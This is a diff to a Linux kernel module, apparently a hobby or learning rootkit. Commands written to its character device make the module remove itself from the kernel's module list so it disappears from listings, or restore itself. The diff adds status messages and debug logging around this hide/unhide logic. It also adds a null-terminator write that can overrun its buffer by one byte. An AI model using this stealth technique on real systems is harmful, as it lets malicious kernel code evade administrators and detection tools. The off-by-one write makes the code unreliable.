@@ -25,6 +25,8 @@ static struct class *myclass = NULL;
 static struct list_head * prev;
 static int hidden = 0;
 
+static char status_str[BUFF_LEN];
+static char * status_str_ptr;
 
 int device_open_count = 0;
 
@@ -35,39 +37,17 @@ static int device_release(struct inode *, struct file *);
 static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
 
-static ssize_t device_read(struct file *filp, /* see include/linux/fs.h   */
-		char *buffer,      /* buffer to fill with data */
-		size_t length,     /* length of the buffer     */
+static ssize_t device_read(struct file *filp,
+		char *buffer,
+		size_t length,
 		loff_t *offset)
 {
-	/*
-	 * Number of bytes actually written to the buffer
-	 */
 	int bytes_read = 0;
-
-	/*
-	 * If we're at the end of the message, return 0 signifying end of file.
-	 */
-	if (*msg_ptr == 0)
-		return 0;
-
-	/*
-	 * Actually put the data into the buffer
-	 */
-	while (length && *msg_ptr) {
-		/*
-		 * The buffer is in the user data segment, not the kernel segment so "*"
-		 * assignment won't work. We have to use put_user which copies data from the
-		 * kernel data segment to the user data segment.
-		 */
-		put_user(*(msg_ptr++), buffer++);
+	while (length && *status_str_ptr) {
+		put_user(*(status_str_ptr++), buffer++);
 		length--;
 		bytes_read++;
 	}
-
-	/*
-	 * Most read functions return the number of bytes put into the buffer
-	 */
 	return bytes_read;
 }
 
@@ -97,18 +77,21 @@ static void parse_command(char * cmd) {
 	int hide;
 	int unhide;
 	hide = strncmp(cmd, "hide\n", BUFF_LEN);
-	pr_info("Hide: %d\n", hide);
+	pr_info("Hide? %d\n", hide);
 	if (hide == 0) {
 		hide_self();
 		return;
 	}
 	unhide = strncmp(cmd, "unhide\n", BUFF_LEN);
+	pr_info("Unhide? %d\n", unhide);
 	if (unhide == 0) {
 		unhide_self();
 		return;
 	}
+	
 
 }
+
 // Called when a process tries to write to our device 
 static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset) {
 	int i;
@@ -116,6 +99,7 @@ static ssize_t device_write(struct file *flip, const char *buffer, size_t len, l
 	for (i = 0; i < len && i < BUFF_LEN; i++)
 		get_user(msg[i], buffer + i);
 
+	msg[i] = NULL; // null terminating byte; very important!
 	msg_ptr = msg;
 
 	/* 
@@ -142,6 +126,7 @@ static int device_open(struct inode *inode, struct file *file)
 	 * Initialize the message 
 	 */
 	msg_ptr = msg;
+	status_str_ptr = status_str;
 	try_module_get(THIS_MODULE);
 	return 0;
 }
@@ -155,20 +140,34 @@ static int device_release(struct inode *inode, struct file *file) {
 }
 static int hide_self(void) {
 	pr_info("In hide_self\n");
-	if (hidden) return -1;
+	if (hidden) {
+		pr_info("Uh oh, hidden != 0\n");
+		strncpy(status_str, "Error: already hidden!\n", BUFF_LEN);
+		return -1;
+	}
 	prev = THIS_MODULE->list.prev;
 	mutex_lock(&module_mutex);
 	list_del(&THIS_MODULE->list);
 	mutex_unlock(&module_mutex);
 	hidden = 1;
+	strncpy(status_str, "Successfully hid.\n", BUFF_LEN);
 	return 0;
+
 }
+
 static int unhide_self(void) {
-	if (hidden == 0) return -1;
+	pr_info("In unhide_self\n");
+	if (hidden == 0) {
+		pr_info("Uh oh, hidden == 0\n");
+
+		strncpy(status_str, "Error: already visible!\n", BUFF_LEN);
+		return -1;
+	}
 	mutex_lock(&module_mutex);
 	list_add(&THIS_MODULE->list, prev);
 	mutex_unlock(&module_mutex);
 	hidden = 0;
+	strncpy(status_str, "Successfully unhid!\n", BUFF_LEN);
 	return 0;
 }
 
@@ -176,8 +175,6 @@ static int __init mod_init(void) {
 	int device_created = 0;
 	pr_info("%s: starting up\n", THIS_MODULE->name);
 	pr_info("%s: filename='%s'\n", THIS_MODULE->name, filename);
-
-
 	pr_info("%s: registering device %s\n", THIS_MODULE->name, filename);
 
 	/* cat /proc/devices */
@@ -198,6 +195,7 @@ static int __init mod_init(void) {
 		goto error;
 	}
 	pr_info("%s: succesfully registered!\n", THIS_MODULE->name);
+	snprintf(status_str, BUFF_LEN, "%s initialized and awaiting command!\n", THIS_MODULE->name);
 	return 0;
 error:
 	cleanup(device_created);
